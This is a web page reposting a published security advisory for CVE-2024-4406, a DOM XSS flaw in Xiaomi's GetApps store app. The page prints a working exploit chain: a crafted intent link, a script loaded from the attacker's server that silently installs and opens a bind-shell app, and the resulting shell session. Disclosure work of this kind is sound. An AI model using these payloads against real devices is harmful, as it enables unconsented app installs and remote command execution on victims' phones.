<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Xiaomi GetApps Arbitrary Application Install | Malicious Erection LLC</title>
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Xiaomi GetApps Arbitrary Application Install" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="This vulnerability allows remote attackers to execute arbitrary code on affected installations of Xiaomi Pro 13 smartphones." />
<meta property="og:description" content="This vulnerability allows remote attackers to execute arbitrary code on affected installations of Xiaomi Pro 13 smartphones." />
<link rel="canonical" href="https://maliciouserection.com/cves/2024-05-01_cve-2024-4406/" />
<meta property="og:url" content="https://maliciouserection.com/cves/2024-05-01_cve-2024-4406/" />
<meta property="og:site_name" content="Malicious Erection LLC" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-05-01T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Xiaomi GetApps Arbitrary Application Install" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-05-01T00:00:00+00:00","datePublished":"2024-05-01T00:00:00+00:00","description":"This vulnerability allows remote attackers to execute arbitrary code on affected installations of Xiaomi Pro 13 smartphones.","headline":"Xiaomi GetApps Arbitrary Application Install","mainEntityOfPage":{"@type":"WebPage","@id":"https://maliciouserection.com/cves/2024-05-01_cve-2024-4406/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://maliciouserection.com/assets/images/logo.png"}},"url":"https://maliciouserection.com/cves/2024-05-01_cve-2024-4406/"}</script>
<!-- End Jekyll SEO tag -->

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
    />
    <link rel="stylesheet" href="/assets/css/main.css" />
  </head>

  <body class="flex flex-col h-screen antialiased">
    <div 
  class="flex-none bg-base-100 shadow-sm h-20 navbar"
  style="height: 10rem;"
>
  <div 
    class="flex-none navbar-start"
    style="height: 9rem;"
  >
    <div class="shadow-lg dropdown">
      <div tabindex="0" role="button" class="lg:hidden btn btn-ghost">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          class="w-5 h-5"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M4 6h16M4 12h8m-8 6h16"
          />
        </svg>
      </div>
      <ul
        tabindex="0"
        class="z-[1] space-y-5 bg-base-100 shadow mt-3 p-2 rounded-box w-72 menu menu-sm dropdown-content"
      >
        
        <li class="text-secondary text-lg">
          <a href="/">Home</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/blog">Blog</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/tools">Tools</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/cves">CVEs</a>
        </li>
        
      </ul>
    </div>
    <a 
      href="/" 
      title="Malicious Erection LLC" 
      class="px-5"
      style="height: 7rem;"
    >
      <img
        src="/assets/images/logo.png"
        alt="Malicious Erection LLC"
        class="w-32 object-center image-center"
        style="width: 15rem;"
      />
    </a>
  </div>
  <div class="hidden lg:flex flex-1 gap-3 navbar-end">
    <ul class="gap-3 px-1 menu menu-horizontal">
      
      <li class="font-semibold text-base">
        <a href="/">Home</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/blog">Blog</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/tools">Tools</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/cves">CVEs</a>
      </li>
      
    </ul>
  </div>
</div>

    <div class="flex-1 overflow-y-auto">
      <div class="min-h-[80vh]"><main>
  <!-- Header Section -->
  <section class="flex justify-center items-center bg-secondary/75 py-16">
    <h1 class="font-bold text-neutral-content text-5xl text-center">Xiaomi GetApps Arbitrary Application Install</h1>
  </section>

  <!-- Content Section -->
  <section class="mx-auto py-10 text-neutral-content prose px-4 sm:px-6 lg:px-8 max-w-full lg:max-w-5xl xl:max-w-[1100px]">
    <h4 id="original-post-httpswwwnccgroupcomusresearch-blogtechnical-advisory-xiaomi-13-pro-code-execution-via-getapps-dom-cross-site-scripting-xss">Original post: <a href="https://www.nccgroup.com/us/research-blog/technical-advisory-xiaomi-13-pro-code-execution-via-getapps-dom-cross-site-scripting-xss/">https://www.nccgroup.com/us/research-blog/technical-advisory-xiaomi-13-pro-code-execution-via-getapps-dom-cross-site-scripting-xss/</a></h4>

<table>
  <tbody>
    <tr>
      <td><strong>Product</strong></td>
      <td>GetApps Store Android Application (<code class="language-plaintext highlighter-rouge">com.xiaomi.mipicks</code>) 30.4.1.0 and below</td>
    </tr>
    <tr>
      <td><strong>Severity</strong></td>
      <td>High</td>
    </tr>
    <tr>
      <td><strong>CVE Reference</strong></td>
      <td>CVE-2024-4406 (ZDI), CVE-2024-45346 (Xiaomi)</td>
    </tr>
    <tr>
      <td><strong>Type</strong></td>
      <td>URL Filter Bypass</td>
    </tr>
  </tbody>
</table>

<h2 id="summary">Summary</h2>

<p>The GetApps Android Application (<code class="language-plaintext highlighter-rouge">com.xiaomi.mipicks</code>) versions 30.4.1.0 and below are vulnerable to a DOM Cross-Site Scripting issue within a privileged WebView. Using this issue, it was possible to execute against a privileged JavaScript Interface to install and open any application available in the GetApps application store.</p>

<h2 id="impact">Impact</h2>

<p>If a malicious application were to be uploaded to the GetApps application store, then this issue could be used to install said application and execute arbitrary shell commands on the victim device.</p>

<h2 id="exploit">Exploit</h2>

<p>To successfully exploit this issue, two files are required to be hosted on an attacker’s web server:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">index.html</code></li>
  <li><code class="language-plaintext highlighter-rouge">yay.js</code></li>
</ul>

<p>The contents of <code class="language-plaintext highlighter-rouge">index.html</code> is below:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
&lt;head&gt;
        &lt;title&gt;yaytitleyay&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
        &lt;script type="text/javascript"&gt;
                var yayhostyay = location.hostname; // gets host / domain, can also set this to a static value
                var yayportyay = location.port // must be a port number of some sort, or let the script get the prot number by itself
                var yaypayloadyay = "{\"title\":\"look at my PoC!\",\"type\":\"yaytypeyay\\u0022\\u003e\\u003csvg onload\\u003d\\u0022javascript\\u003aj\\u003ddocument.createElement('script');j.src\\u003d'http\\u003a\\u002f\\u002f" + yayhostyay + "\\u003a" + yayportyay + "\\u002fyay.js';document.getElementsByTagName('head')[0].appendChild(j);\\u0022\\u003e\",\"subtitle\":\"brought to you by NCC Group\",\"tips\":\"also Pichu is awesome\",\"btnTips\":\"yayexploityay\"}"
                var yayhyperlinkyay = "intent://browse?url=file%3A%2F%2Fintegral-dialog-page.html?integralInfo=" + encodeURIComponent(yaypayloadyay) + "#Intent;action=android.intent.action.VIEW;scheme=mimarket;end"

                var a = document.createElement("a");
                a.href = yayhyperlinkyay;
                a.id = "yayidyay";
                a.innerHTML = "YAYPOCYAY";
                document.getElementsByTagName('body')[0].appendChild(document.createElement("h1"))
                document.getElementsByTagName('h1')[0].appendChild(a);
        &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>The contents of <code class="language-plaintext highlighter-rouge">yay.js</code> is below:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const sleep = async (milliseconds) =&gt; {
    await new Promise(resolve =&gt; {
        return setTimeout(resolve, milliseconds)
    });
};

const thePayloadYay = async () =&gt; {
    var yayflagyay = 1;
    while (yayflagyay == 1){
		var yayinstalledappsyay = marketAPI.getInstalledApps({});
		var yayappslengthyay = yayinstalledappsyay.length;
		var yaycounteryay = 0;
		while (yaycounteryay != yayappslengthyay) {
			if (yayinstalledappsyay[yaycounteryay].packageName === "com.&lt;redacted&gt;.sunfish") {
				marketAPI.openApp({"pName":"com.&lt;redacted&gt;.sunfish"});
				yayflagyay = 0;
			}
			yaycounteryay = yaycounteryay + 1;
		}
	}
	marketAPI.showToast({"content":"waiting for the app to be installed"})
    await sleep(5000);
    
}

marketAPI.install({"extra_params":{"downloadImmediately":"true","fromUntrustedHost":"false","sourcePackage":"com.miui.home","startDownload":"true","callerPackage":"com.xiaomi.mipicks","ext_apm_isColdStart":"false","callerSignature":"88daa889de21a80bca64464243c9ede6","launchWhenInstalled":"true","ext_apm_timeSinceColdStart":"1362443","senderPackageName":"com.xiaomi.mipicks","entrance":"detail","pageRef":"com.xiaomi.mipicks","appClientId":"com.xiaomi.mipicks","refs":"-detail/com.&lt;redacted&gt;.sunfish","sid":"","rId":0,"ad":0,"appStatusType":0,"pName":"com.&lt;redacted&gt;.sunfish","pos":"detailInstallBtn","posChain":"detailInstallBtn","newUser":true,"activedTimeInterval":583925,"adExchangeFlag":0,"_ir_":"8rj6UL-fpnYa7BCFmBSqp5jbHJSm_GgzL6bgn7GqAwc","ext_apm_iconType":"static","ext_apm_isHotTag":false},"ref":"_detailInstallBtn","title":"Sunfish","pName":"com.&lt;redacted&gt;.sunfish","appId":3004617,"appInfo":{"grantCode":0,"openLinkGrantCode":1,"voiceAssistTag":false,"commentable":false,"id":3004617,"appId":3004617,"packageName":"com.&lt;redacted&gt;.sunfish","displayName":"Sunfish","publisherName":"&lt;redacted&gt;","versionName":"1.2.2","versionCode":9,"updateTime":1694181164626,"apkSize":3710211,"compressApkSize":0,"icon":"AppStore/06c542c55a34b47d4a12a45bfe4187f5d8b5d8f10","level1CategoryId":30,"intlCategoryId":30,"ads":0,"adType":1,"position":0,"briefShow":"Help ensure the security of your Android applcation.","briefUseIntro":false,"releaseKeyHash":"0e140764979f5c5c0c44fd526aae29e3",},"sid":"","callBack":"marketAsyncCb.installCb"})
thePayloadYay();
</code></pre></div></div>

<p>The target device should then use a web browser to browse to <code class="language-plaintext highlighter-rouge">http://&lt;attacker’s server&gt;/index.html</code> and click on the hyperlink present on the webpage. When this happens, the above JavaScript will execute which will result in the application “Sunfish” being installed and opened on the device without the user’s consent.</p>

<p>Sunfish is a re-skinned version of Drozer, which starts a bind shell on network interfaces on the device. From there, its possible for the attacker to connect to Sunfish and execute arbitrary commands:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@2ee5edd7a244:/# sunfish console connect --server &lt;phone IP address&gt;
Selecting 746aece8a83d73e2 (Xiaomi 2210132G 13)

                              _.'.__
                           _.'      .
     ':'.               .''   __ __  .
       '.:._          ./  _ ''     '-'.__
     .'''-: '''-._    | .                '-'._
      '.     .    '._.'                       '
         '.   '-.___ .        .'          .  :o'.
           |   .----  .      .           .'     (
            '|  ----. '   ,.._                _-'
             .' .---  |.''  .-:;.. _____.----'
             |   .-''''    |      '
           .'  _'         .'    _'   Sunfish
          |_.-'            '-.'

sunfish Console (v2.4.4)
sunfish&gt; shell
:/data/user/0/com.&lt;redacted&gt;.sunfish $ whoami
u0_a302
:/data/user/0/com.&lt;redacted&gt;.sunfish $ id
uid=10302(u0_a302) gid=10302(u0_a302) groups=10302(u0_a302),3003(inet),9997(everybody),20302(u0_a302_cache),50302(all_a302) context=u:r:untrusted_app_27:s0:c46,c257,c512,c768
</code></pre></div></div>

<h2 id="technical-details">Technical Details</h2>

<h3 id="browsable-intent-details">Browsable Intent Details</h3>

<p>The exported activity <code class="language-plaintext highlighter-rouge">com.xiaomi.market.ui.JoinActivity</code> can be launched via Browsable Intent and executes different Java functions based on the contents of said Browsable Intent. One of the functions, called <code class="language-plaintext highlighter-rouge">handleBrowse(Uri)</code>, can launch a privileged WebView with a potentially dangerous JavaScript Interface. This function can be executed if the “data” within the Browsable Intent contains the following:</p>

<ul>
  <li>A “scheme” value of <code class="language-plaintext highlighter-rouge">mimarket</code></li>
  <li>A “host” value of <code class="language-plaintext highlighter-rouge">browse</code></li>
</ul>

<p>To limit potential attacks which abuse the JavaScript Interface, the application will not let <code class="language-plaintext highlighter-rouge">handleBrowse(Uri)</code> launch the privileged WebView unless the URL is whitelisted. The logic for assessing and validating URLs can be found in class <code class="language-plaintext highlighter-rouge">com.xiaomi.market.util.UrlCheckUtilsKt</code> method <code class="language-plaintext highlighter-rouge">isUrlMatchLevel(String, HostLevel, boolean)</code>.</p>

<p>Below is a high level description of what are considered valid URLs:</p>

<ul>
  <li>If the URL starts with <code class="language-plaintext highlighter-rouge">https://</code>, then the host value must match a whitelisted domain (the whitelist is kept internally within the application)</li>
  <li>If the URL starts with <code class="language-plaintext highlighter-rouge">file://</code>, then the host and path values must match one of the files found in the directory <code class="language-plaintext highlighter-rouge">/data/data/com.xiaomi.mipicks/files/web-res-XXXX</code> on the device</li>
</ul>

<p>Below is a code snippet of the URL being passed from <code class="language-plaintext highlighter-rouge">handleBrowse(Uri)</code> to <code class="language-plaintext highlighter-rouge">isUrlMatchLevel(String, HostLevel, boolean)</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class JoinActivity extends BaseActivity {
...
private void handleBrowse(Uri uri){
  Intent targetIntent;
  ...
  String queryParameter = uri.getQueryParameter(“url”);
  ...
  if (UrlCheckUtilsKt.isJsInterfaceAllowed(queryParameter)) {
    targetIntent = getTargetIntent(intFromIntent == 1 ? FloatWebActivity.class : CommonWebActivity.class);
  ...
  targetIntent.putExtra(“url”), queryParameter;
  ...
  startActivity(targetIntent);
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class UrlCheckUtilsKt {
public static final boolean isJsInterfaceAllowed(String str) {
  ...
  boolean isUrlMatchLevel = isUrlMatchLevel(str, HostLevel.TRUSTED)
...
public static final boolean isUrlMatchLevel(String str, HostLevel level){
  ...
  boolean isUrlMatchLevel = isUrlMatchLevel(str, level, true)
...
public static final boolean isUrlMatchLevel(String str, HostLevel level, boolean z)({
</code></pre></div></div>

<p>If the URL is considered valid, then one of the following WebViews will be launched via <code class="language-plaintext highlighter-rouge">startActivity(Intent)</code>:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">com.xiaomi.market.ui.FloatWebActivity</code></li>
  <li><code class="language-plaintext highlighter-rouge">com.xiaomi.market.ui.CommonWebActivity</code></li>
</ul>

<p>As an example, the following Browsable Intent can be used to launch the exported activity <code class="language-plaintext highlighter-rouge">com.xiaomi.market.ui.JoinActivity</code>, open the privileged WebView <code class="language-plaintext highlighter-rouge">com.xiaomi.market.ui.CommonWebActivity</code>, and open the file <code class="language-plaintext highlighter-rouge">/data/data/com.xiaomi.mipicks/files/web-res-2520/detail.html</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a id="yayidyay" rel="noreferrer" href="intent://browse?url=file%3A%2F%2Fdetail.html#Intent;action=android.intent.action.VIEW;scheme=mimarket;end"&gt;YAYPOCYAY&lt;/a&gt;
</code></pre></div></div>

<p>Below is a screenshot of the resulting <code class="language-plaintext highlighter-rouge">detail.html</code> page. It should be noted that the lack of content is intentional:</p>

<div align="center">
    <img src="/assets/cves/cve-2024-4406_1.png" />
</div>

<h3 id="dom-cross-site-scripting-xss">DOM Cross-Site Scripting (XSS)</h3>

<p>The folder <code class="language-plaintext highlighter-rouge">/data/data/com.xiaomi.mipicks/files/web-res-2520/</code> contained the following types of files:</p>

<ul>
  <li>HTML files – render basic HTML and load JavaScript files to render content</li>
  <li>JavaScript files – the JavaScript files that are loaded by the HTML files</li>
</ul>

<p>Most of the JavaScript files contained an integrated function to filter potentially dangerous characters (the function itself was aptly named “XSS”). This is because some HTML files were required to take user input (via URL GET parameters) and fill out the HTML content based on the user input.</p>

<p>However, the file <code class="language-plaintext highlighter-rouge">integral-dialog-page-chunk.js</code> did not filter out dangerous characters in one area, resulting in the ability to perform a DOM Cross-Site Scripting (XSS) attack in the page <code class="language-plaintext highlighter-rouge">integral-dialog-page.html</code>.</p>

<p>Below is a Browsable Intent PoC which demonstrates this by executing the command <code class="language-plaintext highlighter-rouge">alert(1)</code> after loading the page <code class="language-plaintext highlighter-rouge">integral-dialog-page.html</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;h1&gt; 
&lt;a id="yayidyay" rel="noreferrer" href="intent://browse?url=file%3A%2F%2Fintegral-dialog-page.html?integralInfo=%7b%22%74%69%74%6c%65%22%3a%22%6c%6f%6f%6b%20%61%74%20%6d%79%20%50%6f%43%21%22%2c%22%74%79%70%65%22%3a%22%79%61%79%74%79%70%65%79%61%79%5c%75%30%30%32%32%5c%75%30%30%33%65%5c%75%30%30%33%63%73%76%67%20%6f%6e%6c%6f%61%64%5c%75%30%30%33%64%5c%75%30%30%32%32%6a%61%76%61%73%63%72%69%70%74%5c%75%30%30%33%61%61%6c%65%72%74%28%27%70%72%69%76%69%6c%65%67%65%64%20%6d%61%72%6b%65%74%41%50%49%3a%20%27%20%2b%20%6d%61%72%6b%65%74%41%50%49%29%5c%75%30%30%32%32%5c%75%30%30%33%65%22%2c%22%73%75%62%74%69%74%6c%65%22%3a%22%62%72%6f%75%67%68%74%20%74%6f%20%79%6f%75%20%62%79%20%4e%43%43%20%47%72%6f%75%70%22%2c%22%74%69%70%73%22%3a%22%61%6c%73%6f%20%50%69%63%68%75%20%69%73%20%61%77%65%73%6f%6d%65%22%2c%22%62%74%6e%54%69%70%73%22%3a%22%79%61%79%65%78%70%6c%6f%69%74%79%61%79%22%7d#Intent;action=android.intent.action.VIEW;scheme=mimarket;end"&gt;
        YAYPOCYAY&lt;/a&gt;
&lt;/h1&gt;
</code></pre></div></div>

<p>Decoded payload value:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file://integral-dialog-page.html?integralInfo={"title":"look at my PoC!","type":"yaytypeyay"&gt;&lt;svg onload="javascript:alert(1)"&gt;","subtitle":"brought to you by NCC Group","tips":"also Pichu is awesome","btnTips":"yayexploityay"}
</code></pre></div></div>

<div align="center">
    <img src="/assets/cves/cve-2024-4406_2.png" />
</div>

<h3 id="privileged-javascript-interface-webevent">Privileged JavaScript Interface WebEvent</h3>

<p>The previously mentioned privileged WebView loads the JavaScript Interface “WebEvent” (<code class="language-plaintext highlighter-rouge">com.xiaomi.market.webview.WebEvent</code>).</p>

<p>This JavaScript Interface contained two useful methods which could be executed via JavaScript:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">install(String)</code> – this method will install any application that is available on the getApps store, assuming that the application is available within the region that the device is configured for</li>
  <li><code class="language-plaintext highlighter-rouge">openApp(String)</code> – this method will find the launch intent for any installed application and run that intent, opening the specified application</li>
</ul>

<h3 id="launching-webview-and-executing-against-webview">Launching WebView and Executing Against WebView</h3>

<p>In order to execute JavaScript against the “WebEvent” JavaScript Interface, the i<code class="language-plaintext highlighter-rouge">ntegral-dialog-page.html</code> page must be launched and user input must contain the appropriate JavaScript.</p>

<p>The following Browsable Intent can be used to launch the privileged WebView, load the page <code class="language-plaintext highlighter-rouge">integral-dialog-page.html</code>, and execute the JavaScript command <code class="language-plaintext highlighter-rouge">alert(marketAPI)</code>. This shows that it is possible to execute arbitrarily against the privileged JavaScript Interface found at <code class="language-plaintext highlighter-rouge">com.xiaomi.market.webview.WebEvent</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;h1&gt; 
&lt;a id="yayidyay" rel="noreferrer" href="intent://browse?url=file%3A%2F%2Fintegral-dialog-page.html?integralInfo=%7b%22%74%69%74%6c%65%22%3a%22%6c%6f%6f%6b%20%61%74%20%6d%79%20%50%6f%43%21%22%2c%22%74%79%70%65%22%3a%22%79%61%79%74%79%70%65%79%61%79%5c%75%30%30%32%32%5c%75%30%30%33%65%5c%75%30%30%33%63%73%76%67%20%6f%6e%6c%6f%61%64%5c%75%30%30%33%64%5c%75%30%30%32%32%6a%61%76%61%73%63%72%69%70%74%5c%75%30%30%33%61%61%6c%65%72%74%28%27%70%72%69%76%69%6c%65%67%65%64%20%6d%61%72%6b%65%74%41%50%49%3a%20%27%20%2b%20%6d%61%72%6b%65%74%41%50%49%29%5c%75%30%30%32%32%5c%75%30%30%33%65%22%2c%22%73%75%62%74%69%74%6c%65%22%3a%22%62%72%6f%75%67%68%74%20%74%6f%20%79%6f%75%20%62%79%20%4e%43%43%20%47%72%6f%75%70%22%2c%22%74%69%70%73%22%3a%22%61%6c%73%6f%20%50%69%63%68%75%20%69%73%20%61%77%65%73%6f%6d%65%22%2c%22%62%74%6e%54%69%70%73%22%3a%22%79%61%79%65%78%70%6c%6f%69%74%79%61%79%22%7d#Intent;action=android.intent.action.VIEW;scheme=mimarket;end"&gt;
        YAYPOCYAY&lt;/a&gt;
&lt;/h1&gt;
</code></pre></div></div>

<p>Decoded payload value:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file://integral-dialog-page.html?integralInfo={"title":"look at my PoC!","type":"yaytypeyay"&gt;&lt;svg onload="javascript:alert('privileged marketAPI: ' + marketAPI)"&gt;","subtitle":"brought to you by NCC Group","tips":"also Pichu is awesome","btnTips":"yayexploityay"}
</code></pre></div></div>

<p>Screenshot:</p>

<div align="center">
    <img src="/assets/cves/cve-2024-4406_3.png" />
</div>

<p>Using this, it is possible to execute the JavaScript Interface functions <code class="language-plaintext highlighter-rouge">install(String)</code> and <code class="language-plaintext highlighter-rouge">openApp(String)</code>. To fully take advantage of this issue, an attacker would need to upload a malicious app to the GetApps store. Then this exploit will need to be abused to install said malicious application and launch it automatically.</p>

<h3 id="sunfish">Sunfish</h3>

<p>To demonstrate the severity of this issue, NCC Group uploaded the application “Sunfish” to the GetApps store. Sunfish is a re-skinned version of Drozer, whish a common tool used for penetration testing of Android devices. This version of Sunfish/Drozer is also configured to start a bind shell when the application is launched.</p>

<div align="center">
    <img src="/assets/cves/cve-2024-4406_4.png" />
</div>

<h3 id="combining-the-pieces">Combining the Pieces</h3>

<p>With all of the information above, the workflow for this exploit looks like the following:</p>

<ul>
  <li>User with a Xiaomi 13 Pro browses to an attacker controlled web server and clicks a hyper link that was crafted by the attacker</li>
  <li>The GetApps application is launched and the privileged WebView is launched</li>
  <li>The DOM XSS issue is exploited to inject custom JavaScript into the privileged WebView</li>
  <li>The attacker controlled custom JavaScript executes commands against the “WebEvent” JavaScript Interface to install and open Sunfish</li>
  <li>Sunfish is launched, and a bind shell is started</li>
  <li>The attacker connects to the bind shell, which can then execute commands within the context of Sunfish</li>
</ul>

<h3 id="disabled-browsers-for-specific-versions-of-getapps">Disabled Browsers for Specific Versions of GetApps</h3>

<p>During Pwn2Own Toronto 2023, Xiaomi temporarily implemented code into the GetApps application which would block the ability to launch JoinActivity via Browsable Intent. This code was later removed from GetApps after the Pwn2Own competition had concluded.</p>

<p>Below is a list of GetApps versions, their SHA256 hashes, and which browsers are prohibited from launching JoinActivity:</p>

<ul>
  <li>Version 30.2.7.0</li>
  <li>SHA256 - <code class="language-plaintext highlighter-rouge">4cf142334ed34c3705c2a30c3aba121861e57d8c5d1d8341f194ad4723dc5be8</code></li>
  <li>Browsers blocked:
    <ul>
      <li>Xiaomi Browser (<code class="language-plaintext highlighter-rouge">com.mi.globalbrowser</code>)</li>
      <li>Android HTML Viewer (<code class="language-plaintext highlighter-rouge">com.android.htmlviewer</code>)</li>
      <li>Android NFC (<code class="language-plaintext highlighter-rouge">com.android.nfc</code>)</li>
      <li>Google Chrome (<code class="language-plaintext highlighter-rouge">com.android.chrome</code>)</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">.apk</code> download - <a href="https://github.com/Yogehi/cve-2024-4406-xiaomi13pro-exploit-files/raw/refs/heads/main/getapps-apks/com.xiaomi.mipicks-v4003027.apk">https://github.com/Yogehi/cve-2024-4406-xiaomi13pro-exploit-files/raw/refs/heads/main/getapps-apks/com.xiaomi.mipicks-v4003027.apk</a></li>
  <li>Version 30.2.8.0
    <ul>
      <li>SHA256 - <code class="language-plaintext highlighter-rouge">7637f7fe3dd1c53e072069faabda59683272115e561fa5e400bd0586093accd1</code></li>
      <li>Browsers blocked:</li>
      <li>Xiaomi Browser (<code class="language-plaintext highlighter-rouge">com.mi.globalbrowser</code>)</li>
      <li>Android HTML Viewer (<code class="language-plaintext highlighter-rouge">com.android.htmlviewer</code>)</li>
      <li>Android NFC (<code class="language-plaintext highlighter-rouge">com.android.nfc</code>)</li>
      <li>Google Chrome (<code class="language-plaintext highlighter-rouge">com.android.chrome</code>)</li>
      <li>Opera Browser (<code class="language-plaintext highlighter-rouge">com.opera.browser</code>)</li>
      <li>Yandex Browser (<code class="language-plaintext highlighter-rouge">com.yandex.browser</code>)</li>
      <li><code class="language-plaintext highlighter-rouge">.apk</code> download - <a href="https://github.com/Yogehi/cve-2024-4406-xiaomi13pro-exploit-files/raw/refs/heads/main/getapps-apks/com.xiaomi.mipicks-v4003028.apk">https://github.com/Yogehi/cve-2024-4406-xiaomi13pro-exploit-files/raw/refs/heads/main/getapps-apks/com.xiaomi.mipicks-v4003028.apk</a></li>
    </ul>
  </li>
</ul>

<p>The application logic to block the above browsers can be seen in the below code snippet, taken from GetApps version 30.2.7.0.</p>

<p>The value <code class="language-plaintext highlighter-rouge">matchSpecialCallingPackage</code> is set to <code class="language-plaintext highlighter-rouge">true</code> if the Browsable Intent was sent from one of the above blacklisted browsers. Since <code class="language-plaintext highlighter-rouge">matchSpecialCallingPackage</code> is <code class="language-plaintext highlighter-rouge">true</code>, the method <code class="language-plaintext highlighter-rouge">handleIntent()</code> will always return before the <code class="language-plaintext highlighter-rouge">handleBrowse(Uri uri)</code> function can be executed.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class JoinActivity extends BaseActivity {
...
    private void handleInent() {
    ...
    boolean matchSpecialCallingPackage = matchSpecialCallingPackage();
    ...
                if (matchSpecialCallingPackage) {
                        if (!TextUtils.equals(targetPage, PAGE_DETAILS) &amp;&amp; !TextUtils.equals(targetPage, "detail") &amp;&amp; !TextUtils.equals(targetPage, PAGE_LAUNCH_DETAIL)) {
                            launchTargetActivity(MarketTabActivity.class);
                        } else {
                            handleDetails(intent, scheme, targetPage);
                        }
                        MethodRecorder.o(9268);
                        return;
                    }
                ...
                if (TextUtils.equals(targetPage, PAGE_BROWSE)) {
                        handleBrowse(data);
                        MethodRecorder.o(9268);
                        return;
                    }
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>private boolean matchSpecialCallingPackage() {
    ...
    boolean contains = sBlackPkgArrayList.contains(getCallingPackage());
    ...
    return contains;
}
</code></pre></div></div>

<h2 id="recommendation">Recommendation</h2>

<p>Xiaomi has stated that this issue was resolved in GetApps version 32.0.0.1. Users should update their GetApps application to at least that version.</p>

<h2 id="timeline">Timeline</h2>

<table>
  <tbody>
    <tr>
      <td><strong>Date</strong></td>
      <td><strong>Summary</strong></td>
    </tr>
    <tr>
      <td>2023-10-25</td>
      <td>Exploit demonstrated at Pwn2Own Toronto 2023, exploit details handed over to Zero Day Initiative (ZDI)</td>
    </tr>
    <tr>
      <td>2023-11-09</td>
      <td>ZDI reported vulnerability to Xiaomi</td>
    </tr>
    <tr>
      <td>2024-05-01</td>
      <td>Coordinated public release of advisory, CVE assigned by ZDI</td>
    </tr>
    <tr>
      <td>2024-08-09</td>
      <td>CVE assigned by Xiaomi</td>
    </tr>
  </tbody>
</table>

<p>NOTE: On 2024-05-01, Xiaomi had not assigned a CVE for this issue. When ZDI worked with Xiaomi to patch this issue, Xiaomi informed ZDI they would assign a CVE, but never followed through. So instead, ZDI has assigned the CVE number CVE-2024-4406 for this issue.</p>

<p>NOTE 2: On 2024-08-09, Ken Gannon and Ilyes Beghdadi gave a talk at Defcon 32 about the story behind this exploit. After that talk, Xiaomi updated their security advisory page to reflect that a CVE was assigned by Xiaomi. The CVE was also backdated to 2024-05-06.</p>

  </section>

  <!-- CTA Button (optional) -->
  
</main>
</div>
      <div class="bg-neutral-800">
  <footer class="mx-auto py-10 container">
    <div class="flex flex-wrap justify-center gap-3 mb-10 align-center">
      
      <a href="/" class="btn btn-secondary btn-ghost"
        >Home</a
      >
      
      <a href="/blog/" class="btn btn-secondary btn-ghost"
        >Blog</a
      >
      
      <a href="/tools" class="btn btn-secondary btn-ghost"
        >Tools</a
      >
      
      <a href="/vulnerability-disclosure-policy" class="btn btn-secondary btn-ghost"
        >Vulnerability Disclosure Policy</a
      >
      
      <a href="/cves/" class="btn btn-secondary btn-ghost"
        >CVEs</a
      >
      
    </div>
    <div class="flex justify-center items-center gap-3 mb-10">
      
      <a
        title="Github"
        href="https://github.com/MaliciousErection"
        class="btn btn-ghost btn-circle"
      >
        <i class="fa fa-github text-xl"></i>
      </a>
      
    </div>
    <p class="text-center">© 2025 Malicious Erection LLC.</p>
  </footer>
</div>

    </div>
  </body>
</html>
